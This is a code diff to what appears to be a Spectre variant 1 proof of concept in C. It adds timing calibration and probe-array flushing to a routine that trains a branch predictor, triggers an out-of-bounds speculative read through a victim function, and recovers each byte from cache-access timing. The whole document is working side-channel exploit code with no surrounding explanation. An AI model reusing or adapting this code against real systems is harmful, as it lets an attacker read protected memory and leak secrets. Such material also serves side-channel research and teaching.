@@ -15,14 +15,13 @@
 #include <x86intrin.h>
 #endif
 
-#define MIN_ITERATIONS 2
-#define BRANCH_TRAINS 20
-#define PAGE_SIZE 2048
-//#define PAGE_SIZE (1<<20)
-#define CUTOFF_TIME 500
-#define CACHE_HIT_COEFF 3
 
-#define    __unused    __attribute__((__unused__))
+// Play with these
+#define BRANCH_TRAINS 20
+
+
+// Probably don't want to play with these
+#define PAGE_SIZE 4096
 
 FILE *output = NULL;
 
@@ -32,10 +31,25 @@ size_t array_size = BRANCH_TRAINS;
 volatile uint8_t base_array[BRANCH_TRAINS];
 uint64_t temp;
 
+#define SYSTEM_LEARN_COUNT 1000
+uint64_t cache_hit_time;
+
 void init_spectre() {
   side_effects = malloc(side_effects_size);
   memset(side_effects, 0xda, side_effects_size); // Not zero because 0-page
   memset((uint8_t *) base_array, 0, BRANCH_TRAINS);
+  temp = side_effects[0];
+  uint64_t sum = 0;
+  for (int i = 0; i < SYSTEM_LEARN_COUNT; i++) {
+    __sync_synchronize();
+    uint64_t start = __rdtsc();
+    __sync_synchronize();
+    temp = side_effects[0];
+    __sync_synchronize();
+    volatile uint64_t time = __rdtsc() - start;
+    sum += time;
+  }
+  cache_hit_time = sum * 17 / SYSTEM_LEARN_COUNT / 10;
 }
 
 uint8_t __attribute__((noinline)) victim_function(uint64_t i) {
@@ -45,20 +59,18 @@ uint8_t __attribute__((noinline)) victim_function(uint64_t i) {
 }
 
 uint8_t read_at(uint64_t addr) {
-  volatile uint64_t c_sum = 0, c_cnt = 0, c_fail = 0;
-  uint64_t c_i_sum[256] = {0}, c_i_cnt[256] = {0};
   addr -= (uint64_t) &base_array; // address relative to our array
-  for (volatile uint64_t t_iter = 0;; t_iter++) {
+  for (uint64_t t_iter = 0;; t_iter++) {
     for (volatile uint64_t i = 0; i < BRANCH_TRAINS; i++) { // training
       victim_function(i);
     }
-//    _mm_clflush(&side_effects[0]);
     _mm_clflush(&array_size);
-    _mm_clflush(&side_effects[0]);
+    for (uint64_t i = 0; i < 256; i++) {
+      _mm_clflush(&side_effects[i * PAGE_SIZE]);
+    }
     for (uint64_t i = 0; i < BRANCH_TRAINS; i++) {
       _mm_clflush((uint64_t *) &base_array[i]);
     }
-//    _mm_clflush((uint64_t *) &base_array);
     victim_function(addr);
 
     for (volatile uint64_t i = 0; i < 256; i++) {
@@ -67,35 +79,19 @@ uint8_t read_at(uint64_t addr) {
       __sync_synchronize();
       temp = side_effects[i * PAGE_SIZE];
       __sync_synchronize();
-      uint64_t time = __rdtsc() - start;
-      _mm_clflush(&side_effects[i * PAGE_SIZE]);
-      // If the read is abnormally slow we have to start over - got interrupted by the OS.
-      if (time > CUTOFF_TIME) {
-        c_fail++;
-        continue;
-      }
-      if (t_iter > MIN_ITERATIONS && c_i_cnt[i]) {
-        uint64_t average = (c_sum - c_i_sum[i]) / (c_cnt - c_i_cnt[i]);
-        if (time * CACHE_HIT_COEFF < average) {// faster than else's average - that's a cache hit.
-          if (output != NULL) {
-            fprintf(output,
-                    "%p = %c - page takes %lld cycles to read (average = %llu) (took %llu iterations, %llu reads (%llu fails) and %llu cycles)\n",
-                    (void *) addr,
-                    (char) i,
-                    (long long) time,
-                    (long long) average,
-                    (long long) t_iter,
-                    (long long) c_cnt,
-                    (long long) c_fail,
-                    (long long) c_sum);
-          }
-          return i;
+      volatile uint64_t time = __rdtsc() - start;
+      if (time <= cache_hit_time) {// faster than else's average - that's a cache hit.
+        if (output != NULL) {
+          fprintf(output,
+                  "%p = %c - page takes %lld cycles to read (average = %llu) (took %llu iterations)\n",
+                  (void *) addr,
+                  (char) i,
+                  (long long) time,
+                  (long long) cache_hit_time,
+                  (long long) t_iter);
         }
+        return i;
       }
-      c_sum += time;
-      c_cnt++;
-      c_i_sum[i] += time;
-      c_i_cnt[i]++;
     }
   }
 }
